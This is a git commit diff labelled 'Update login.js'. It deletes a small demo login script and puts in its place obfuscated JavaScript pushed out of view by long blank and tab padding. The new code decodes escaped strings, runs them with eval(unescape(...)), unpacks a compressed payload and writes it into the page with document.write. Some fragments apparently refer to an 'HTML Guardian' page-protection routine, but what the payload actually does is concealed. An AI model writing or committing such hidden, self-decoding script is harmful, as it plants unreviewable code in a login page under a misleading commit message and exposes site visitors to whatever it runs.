de291a98fa9e25b298688b7639549c6a2ffe55f5
aamobiletv1981 <136544661+aamobiletv1981@users.noreply.github.com>
2024-02-14 16:59:59 +0100

    Update login.js

--- LOGIN-1/login.js
+++ LOGIN-1/login.js
@@ -1,26 +1,128 @@
-const form = document.querySelector("form")
+l1l=document.documentMode||document.all;var f9f76c=true;ll1=document.layers;lll=window.sidebar;f9f76c=(!(l1l&&ll1)&&!(!l1l&&!ll1&&!lll));l_ll=location+'';III=document.location.href.toLowerCase();II1=String.fromCharCode(102,105,108,101,58);IIl=III.indexOf(II1)<0?true:false;l11=navigator.userAgent.toLowerCase();function lI1(l1I){return l11.indexOf(l1I)>0?true:false};lII=lI1('kht')|lI1('per');f9f76c|=lII;zLP=location.protocol+'0FD';f9f76c&=IIl;
 
-form.addEventListener("submit",(e)=>{
-    e.preventDefault()
 
-    const username = form.username.value
-    const password = form.password.value
 
-    const authenticated = authentication(username,password)
 
-    if(authenticated){
-        window.location.href = "https://www.nairaland.com/"
-    }else{
-        alert("wrong")
-    }
-})
 
-// function for checking username and password
 
-function authentication(username,password){
-    if(username === "admin" && password === "password"){
-        return true
-    }else{
-        return false
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+																																							gCGf54k9=new Array();v9vY84xa=new Array();v9vY84xa[0]='r%66%78%44l%33S\111r';gCGf54k9[0]='	~za~~~~~~~~~	~\n~~~\r~~~~~~~~~~~~~~\r~~~~ ~!~"~#~$~%~&~\'~(~)~*~+~,~-~.~/~0~1~2~3~4~5~6~7~8~9~:~;~<~=~>~?~@~A~B~C~D~E~F~G~H~I~J~K~L~M~N~O~P~Q~R~S~T~U~V~W~X~Y~Z~[~Z~~^~_~`~a~b~c~d~e~f~g~h~function p(){var h = "tml>";~x~zc~}~<h"+h+"<table width=\'100%\' border}0\'>}r}0td}&gcol}(}#}"66}"}%alig~r~~\'cent}+}/<f~qt sty}~}\'}Q}L-family: V}+dana, Ari}C}lHelve~oc}k}T}is-s}+if; }[t}~ize}d12px|}8}:r}d#F|||backgro~ld-|}(|}>}@}.>Th}s| r}J }8}* of }is~sag}|:~s|}M~ne}5by <b}0|}T}V}X}|$| |FCC}A>HTML Gu~yd}pn</|}0/|K|Ib}2|+}ul~oma}M|8o}9|w|Ao|C}Sy|/ |[|]|2o}*}li|t|>s}lJa~x app}t{ {\r~xsc}op{}l}Dnk{keep}eb{}L}K}Sf}a}Mr|;awa|H}i}5muc~|m}(e.{A|I|g}R}0|m}0a|N}W}}}Mx|}*}8r|u~pn}dn~qe|}9|%|T||W}A~{ref}http://w{n.p|B{5{c.}8m}%}r|>t}_}}ik}/|l|L}R{J|P}Z}R}]}_}a}c}e}g}i}z}n}pl}r}t}v}x}zs}|}~|za||z	s||\n ||{[||{_|X0|||||!|#{\\|S}=0}?|Y{nw.P|BW~y{@{v|f|h|f|K|fa|i}4zH}2|f}}e|i}\r};w}\n}ndoz:op}K("","myzVz`~|,}E{g=}!0,}}}7}"")zS.zXcum{-.w}o}M(c)};~tzudl=zxzzz|l{6}+s;oe=zVzXzZz\\{S?1:z,}h=(yz{}Lzwozyy#tM{e||y"z|}Cl)&&!y;|>y\ny&yy${{E}y(ByIdzSsyizWzY.z!}*|r?tru|\n}^l};tN=}jv}E|u}(.u}rA|>y$toLzY}+Ca}~u;|y[yZ.yI}*xOf(\'n}w{{e\')>=0yQySyU}CyXz|:y\na;x\rs8x}~y msg}\';~k~m~o~q y~m~u{{ctur~ryRyTyyyK{Yr|~z~~x$xOFyHyJz:}:}yx!n{p|By&}9yvzWeyyy{}Z}ax)!=-1xyT:yVyXi7{exy4!zx9xSx\nyW{Z|y!a~vy/y$~qd{Sg}U~y{|x~n{U x&x(x*~rxVeyxqx@|2IEx&(xgzuxvx+|xxzx~lxrx"ccx&xht.~';c46e40='fu';p81CElh98x='TONoSQOWHOIgObuOMmBJLsoi';c46e40+=  'nction ojC8W0VVQ0D'+'w38535iFvHn(qA5bB7'+'y8cWd37R){';nnrOtkifUcGIe3='i\146%28%7A%4CP%2Einde%78%4Ff%28%27%5C%35%35%27%29%3E%30%29%7B\147%43%47%66%35%34k%39%5B%30%5D%3D%27%78%27%7D%3B\166\141\162%20l%32%3D\167in\144o\167%2E\157pe%72%61%3F%31%3A%30%3Bfu%6E%63\164\151on%20\143%36%37\146%39f%28%29%7Bif%28%66%39f%37%36c%29%7B\144%6F\143umen\164%2Ew\162i\164%65%28%27%3C\163c\162%27%2B%27\151%70t%3E%27%2BlO%2B%27%3C%2Fsc%27%2B%27%72%69%70t%3E%27%29%7D%7D%3B\146un%63\164\151%6Fn%20l%33%28%6C%34%29%7B\154%35%3D%2Fza%2F\147%3B\154%36%3DStrin%67%2E%66ro%6DC%68ar%43ode%28%30%29%3B\154%34%3Dl%34%2E%72e\160%6Cac%65%28l%35%2C\154%36%29%3B\166ar%20%6C%37%3Dnew%20Arra%79%28%29%2Cl%38%3D%5F%31%3D\154%34%2E\154en\147\164\150%2C\154%39%2C\154I%2C\151l%3D%31%36%32%35%36%2C%5F%31%3D%30%2C\111%3D%30%2Cl%69%3D%27%27%3B%64%6F%7B\154%39%3D%6C%34%2Ec';eval(unescape('%66un\143%74i\157%6E%20%68%75%39h%36\125%34%63B%20%20%20%20%28\162%6C%54\146%35w\103%47\126%29%7B%73%38%35\106%36q%4F%31\155%35%3Drl\124%66%35%77C\107V%7D%3B'));v9vY84xa[0]+=  '\154D%36%49E%35o%54%32\161';gCGf54k9[0]+=  'q}8{,{Oy#u=cx;}tT{e| tz^w~uz`2}"y;w\'w,x|xscNS(e~vxdyy-wsw7y{{@whi{<==2y-w?wAwC=3~vwxw}wxwwxb}wUyry{yxgy;y({u{x){cE}v}Ls(waz|MOUSEDOWNyw[z|~q{>yc|EzYnww3}}t}{wwnwu}upwzSyvzaw}RxH}}Kwy~zTFwx@z^wxxw	ztwW(y~vw0x"|w5w=w5wbwbu{h~qwD2~v}C}+w%}%x;v 0yv4x-w\nv\nv| }ywy|x{vxsns9x&x0z:xnx)yGv1w}ww!z{w$y|vEvG)\',zl0wPw_x,x	yxdy6w6{vUyqv;vw#}v},vU;vgv=w#v(y\\vFvBx xsu0(xfx\'wQwxyvtw\r~ru1v"v{v]w5.{y{{u|=N}_exOn|qly4{@u	}wugu\rz{yLe~y{<y|^(INPUT|TEXTAREA|Bu&TON|wkLECu\'EMBwl|OBJu:u\'{L)$xxOxQw/vCx"u2uxdwHwB}zk~vvIw]{x*ewfwcwev%.whwju=OVEzuuZwtvo{>}v=vwwVvu3uSw>z}wIuW1uYywyK{c}you^v%wdu_wudwkwhuhuju}zZv<wvunyullwV w8y2{uZ}yu\\w`tuawgwiwkUP|tuct!wlwnwpzStvvhv?up2t,x<t.vovup3w|xbty{|>x\\}hwZy\'wstv>wxup1vx}nnx&xduZ{{S}teuza~v}|8x;y.tPtRuza~uuoSyRyIgyqxdwywxHyzy|qwusdzxcx>1y-w}ng}>4v[wwry$}\'dyxFy~ruG}.xx>{T~q.uoad~uywvQvpw%"tKw(,w*v[wVszuusx#itMwXvzv;}}~nxnrxpuO~rxuv|vwTvOw w"vSss&)w)w+s!s<x~zqlvxyvmmwyvzas\rx@.h{c|dsIy\nsIt_yktmrynypysSsRxAsub}Ury!sUthxIy|{lx+v,sHsJsUs`sbtbtz(zms^xFyxtj\'/xzu{4tezT}n{Syy|z9.a}_obxLw}(ld.}jutzvX\'r	{>r}rrrrurgrrrrxLrrr",rr\nr{@rr/r*\'r$r-xLtvr(r1rr%r.r7r9r!r;r5{r8{vr@r+r4rr6rDomrFr,rr7w*90tZi}sayvor#{or<rJ.}rArIrCr_lrw*22r	rg2rUrWbrYr[z:r]rccfrar&rtrvr+zXzXniyirmhrX~prqrrB}wr8tzr+rsq	uzs#}(wx;m<s.tyt{hq++v#swsgtjs[m]xuM{sDvv9;|mukwVvaq,~v|9sqy&sxAsO{d}}w$:{{!\'v`s(x\\yx\\xXfvc}<\'+\'|cvzy"poz!x@:}|.lv({Z}ft:xQ}"0z&yi{jqg}"z&zo}:}@z&zhg{g:35z&z-sg:1">qQ\'qPqRyIpv(|8yz\\="v\'v)n"x#up\rxqqp~xq`qWp~qC}D|wcs)qVp\ry^z!rr';function w38535iFvHnojC8W0VVQ0D(eNcr2t){p81CElh98x+=eNcr2t};c46e40+=  'eva';l452e5Z21='GiPUtLQMwXdRaRJX';c46e40+=  'l(unes';pfU0wE82='fl5hQV8Roftw3AgJV7a';c46e40+=  'cape(qA5bB7y8cWd37R))}';eval(c46e40);tnH15tTk956LV8J='XxvYOeKOgXVOlwOEOVYE';c46e40='';nnrOtkifUcGIe3+=  '\150\141r\103\157d%65%41\164%28%5F%31%29%3B\154%49%3D\154%34%2Ec%68a%72C\157deA%74%28%2B%2B%5F%31%29%3Bl%37%5B\111%2B%2B%5D%3Dl\111%2Bi%6C%2D%28%6C%39%3C%3C%37%29%7D%77hi%6C%65%28%5F%31%2B%2B%3C%6C%38%29%3B%76a\162%20\154%31%3Dn%65%77%20A\162ray%28%29%2Cl%30%3Dn%65w%20\101\162r\141y%28%29%2C%49\154%3D%31%32%38%3B%64%6F%7Bl%30%5BIl%5D%3DS%74%72i%6E%67%2E\146r\157mC%68%61\162\103o%64%65%28I\154%29%7Dwh%69%6C\145%28%2D%2D\111l%29%3B\111%6C%3D%31%32%38%3Bl%31%5B%30%5D%3Dl\151%3D%6C%30%5Bl%37%5B%30%5D%5D%3B%6Cl%3D%6C%37%5B%30%5D%3B%5F\154%3D%31%3Bv\141\162%20l%5F%3Dl%37%2Ele%6E\147th%2D%31%3Bw%68\151le%28%5F%6C%3C%6C%5F%29%7B%73%77%69\164ch%28\154%37%5B%5Fl%5D%3C%49%6C%3F%31%3A%30%29%7Bc\141%73%65%20%30%20%3A%6C%30%5BI\154%5D%3D%6C%30%5Bl%6C%5D%2BSt%72i\156%67%28l%30%5B%6Cl%5D%29%2E\163';cpNLdG4801M='l';gCGf54k9[0]+=  'V}cwAd}*p}0p/qTpvmswz~rVe(fywvuwp#x&c}Dp}\'|bD|ua{utzarpI}sp?uza|2}Jx&pqpLwBkyqss9v(w&pUs=,3s?s7ss:wp;pbpdpe<{{}S}Vz\\}\n}zav\r/j{yo{i{p\r\ntV}8~l}S~~t2ps$p}|upj {ptV~l}\nvzazc}QrrMwvx+r pyT;oxpzT~~oyorMo }(ro{Zo~zo	}5~~sGo, ~lr{6}\n["j|ap}l"o2zfo>yd3oAo4"]| {l{qui~syT|4|={cgxyizX|;}:|;yc|a}oqZ oN}oNi}+ao2o o5|H~~o8|345oApyosrdo@o=ossouo(oDoyotovoGoI oK/}Tyc|<o{ov{x3esqYzWoe{,so}(xttViqt|Io4x3{6q}Kq|iqp%o\n|xt(owDo3noj[iq( y4xto ~}~~oinyn1q(n&o}Do/|8x	o\nq0aknE}pnKn(|7(o.n?\nv.s/xt"Api|. Oyi{zso!vpuZsLxs~~"{g{i{k{m{og|xg}{urL}pv4o1\nnMn)y| }L xz$nRnT}Sz^Us`~y~p |HPnzao( Ino.n`!\\nm}M}Lo`|cn~qizNs}dp+{ozupo#o%ybydr0.o*ptnt\nm\'}(o&ovm,}CyTm.nEp]vRp_"m1om)}+m+}Qzywdpb 25m%\nm:sz^m>om*r s+tSw%mFmHmJon}--nJpw}}n\'mnVY{I{X}T}y}`mxyot{,msnamJmOm@oum-ngnX}JnZB}:obn_nanEmto\'})m5pm8m&p7r_o$m2mum+m}}nBq.l	tBy$ol\rlrlzNlnDnus4wSyXnLl$m0l\np9yzap{G|JzKbRpmsl\'zp;po%pz{ptlopv2ly<p8l3y|<qT{}D}Fp\r}J{,rl<l1ll@p:y|n<lI{1l0ll2lP}%|IzM}X}\'})}+p\r0p}Jtosp.tclalc}tyWosclh"lb}}}p\rpd%lLlWlNz}lAlZlRyRlVl>w\\l(l4nkl[}5qp}"zllw}6|Rp\r#DAkklxkz|klB{\'}C}Ewy"lT}+p}Pz}^}Jp\rz}Cpz!|	luk"|kzD|izC/pkzal&lzkpklFkk lKzn}k%qWk(lk*z"k-{F>mo^~p}d<pp	pry{N}Sr0upmQz{k5vzak8lR|jk1{E|fk4l=k6l?l{lY<k:klH{-k!kYlXl)k#k@|kB}ok)}TkF"oDkHmn\no(k0zBk_|MkAk\'ktkDkvk,kxk.>kMkOpqpyozo|})l7jnk+qW18kkckl|k~{D}Lkmk7l|{CkalMkdk8kglEkikkkk>kbkZjjkrjzkEjky|Jj!j\'jjp\nppyi~ro*=E}L{S~zkUSsamj|5~mp kngo.ow(|izEjt|ij%lyj;kf{Doj:jlYj/knkkkkg>{CzIjcj"lYkzL}2jlj\\l)k\\l\\zOjrjajt{Ck=j`kjp3ivj}y$k8kb|fpop|jX~iiii\riiiii~~\\iiiiiiiiiiii i!i"i#i$i%i&i\'i(i)i*i+i,i-i.~@ii1i2i3i4i5i6i7~';nnrOtkifUcGIe3+=  '%75\142st%72%28%30%2C%31%29%3B\154%31%5B%5F\154%5D%3Dl%30%5BI%6C%5D%3Bi\146%28\154%32%29%7Bl\151%2B%3D%6C%30%5B\111\154%5D%7D%3B%62\162\145ak%3B\144\145%66au%6C%74%3Al%31%5B%5F\154%5D%3Dl%30%5Bl%37%5B%5F\154%5D%5D%3B%69f%28%6C%32%29%7B\154i%2B%3Dl%30%5Bl%37%5B%5F%6C%5D%5D%7D%3B\154%30%5B\111%6C%5D%3Dl%30%5Bl\154%5D%2B%53\164\162i\156\147%28\154%30%5B%6C%37%5B%5Fl%5D%5D%29%2Esu%62\163tr%28%30%2C%31%29%3B%62r\145a%6B%7D%3B\111l%2B%2B%3B%6C%6C%3D%6C%37%5B%5Fl%5D%3B%5Fl%2B%2B%7D%3Bi\146%28%21l%32%29%7Bre\164%75\162\156%28\154%31%2E%6A\157\151\156%28%27%27%29%29%7De\154%73%65%7B%72e\164\165\162%6E%20\154%69%7D%7D%3B%76%61%72%20l\117%3D%27%27%3B\146\157%72%28i\151%3D%30%3B%69\151%3Cg%43G\146%35%34k%39%2E\154e%6E\147\164\150%3Bii%2B%2B%29%7Bl%4F%2B%3Dl%33%28gCG\146%35%34\153%39%5B\151i%5D%29%7D%3Bc%36%37f%39%66%28%29%3B';tnH15tTk956LV8J      ='StWiBNZfNoSOmOOXXWgOgJDkLKYa';dE74t28J7lV='tVEsOhu8c43HiDR';w38535iFvHnojC8W0VVQ0D    (l452e5Z21);ojC8W0VVQ0Dw38535iFvHn  (nnrOtkifUcGIe3);hu9h6U4cB  (nnrOtkifUcGIe3);cpNLdG4801M+=  'krjqFOtGUyBcOaGHxdMRPcyvOOaamOOIljYDneDOwJaleOOVKCqjoPFatXcY';pfU0wE82+=  'uFMnB59a4k0n6';
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
